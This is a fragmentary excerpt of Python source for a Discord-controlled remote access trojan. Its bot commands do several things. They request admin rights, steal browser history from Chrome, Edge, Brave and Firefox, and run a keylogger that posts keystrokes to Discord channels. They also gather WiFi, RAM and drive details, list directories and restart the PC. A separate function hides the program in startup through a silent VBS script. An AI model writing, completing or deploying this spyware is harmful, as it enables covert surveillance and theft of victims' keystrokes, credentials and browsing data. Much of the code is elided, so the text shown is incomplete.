...
async def su(ctx):
    try:
        ...
        await ctx.send(f"🔄 Requesting administrator privileges... This window will close if accepted.{watermark()}")
    ...
    try:
        ...
        if browser in ["chrome", "edge", "brave"]:
            ...
            if not path or not os.path.exists(path):
                await ctx.send(f"❌ {browser.capitalize()} not found or no history available.{watermark()}")
                return
            ...
            if not history_files:
                await ctx.send(f"❌ No history found for {browser.capitalize()}.{watermark()}")
                return
            ...
            if not os.path.exists(firefox_path):
                await ctx.send(f"❌ Firefox not found or no history available.{watermark()}")
                return
            ...
            for history_file in history_files:
                try:
                    ...
                    for url, title, visit_time in cursor.fetchall():
                        timestamp = datetime(1970, 1, 1) + datetime.timedelta(microseconds=visit_time)
                        history.append({
                            'url': url,
                            'title': title if title else '[No Title]',
                            'time': timestamp.strftime('%Y-%m-%d %H:%M:%S'),
            ...
            await ctx.send(f"❌ Unsupported browser. Try 'chrome', 'edge', 'brave', or 'firefox'.{watermark()}")
            return
        ...
        message = f"🌐 Recent browsing history from {browser.capitalize()}:\n" + "\n".join(output) + watermark()
        if len(message) > 2000:
        ...
        await ctx.send(f"An error occurred while collecting browsing history: {e}{watermark()}")
...
async def restart(ctx):
    try:
        await ctx.send(f'🔄 Restarting PC in 5 seconds... Type `!cancelrestart` to abort.{watermark()}')
        time.sleep(5)
        ...
        if log_active and active_channels:
            ...
            if key_log:
                ...
                for channel_id in active_channels:
                    ...
                    if channel:
                        try:
                            await channel.send(f'⌨️ Keys pressed (last 15s):\n```{keys_str}```{watermark()}')
                        except Exception as e:
...
async def log(ctx):
    ...
    if log_active:
        ...
        await ctx.send(f'✅ Keylogging started! (Updates every 15 seconds){watermark()}')
...
async def msg(ctx, *, message: str):
    try:
        ...
        await ctx.send(f'✅ Message box displayed with text: {message[:100]}...{watermark()}')
    except Exception as e:
        await ctx.send(f'Error showing message box: {e}{watermark()}')

@bot.command()
async def help(ctx):
    help_embed = discord.Embed(title='Bot Commands Help', description=f'Here are all the available commands:{watermark()}', color=discord.Color.blue())
    commands_list = [
    ...
    for i in range(0, len(commands_list), 25):
        embed = discord.Embed(title='Bot Commands Help' if i == 0 else None, 
...
async def ls(ctx):
    try:
        ...
        await ctx.send(f'**Directory listing for:** `{current_dir}`\n```\n{output[:1900]}\n```{watermark()}')
    except Exception as e:
...
async def wifi(ctx):
    try:
        ...
        await ctx.send(f'**Connected WiFi Info:**\n```\n{result.strip()}\n```{watermark()}')
    except Exception as e:
...
async def ram(ctx):
    try:
        ...
        result = subprocess.check_output('wmic memorychip get speed,partnumber,manufacturer', shell=True, text=True)
        await ctx.send(f'**RAM Info:**\nTotal: {total_gb} GB\n```\n{result.strip()}\n```{watermark()}')
    except Exception as e:
    ...
    try:
        ...
        for line in lines[1:]:
            ...
            if len(parts) >= 4:
                ...
                output_lines.append(f"{drive:<6} {desc:<15} {size_gb:>5} GB {free_gb:>5} GB")

        await ctx.send(f'**Drives Info:**\n```\n' + '\n'.join(output_lines) + f'\n```{watermark()}')
    except Exception as e:
...
def add_to_startup():
    try:
        ...
        if exe_path.endswith('.py') or exe_path.endswith('.pyw'):
            ...
            subprocess.run(['wscript.exe', temp_vbs], creationflags=subprocess.CREATE_NO_WINDOW)
            os.remove(temp_vbs)
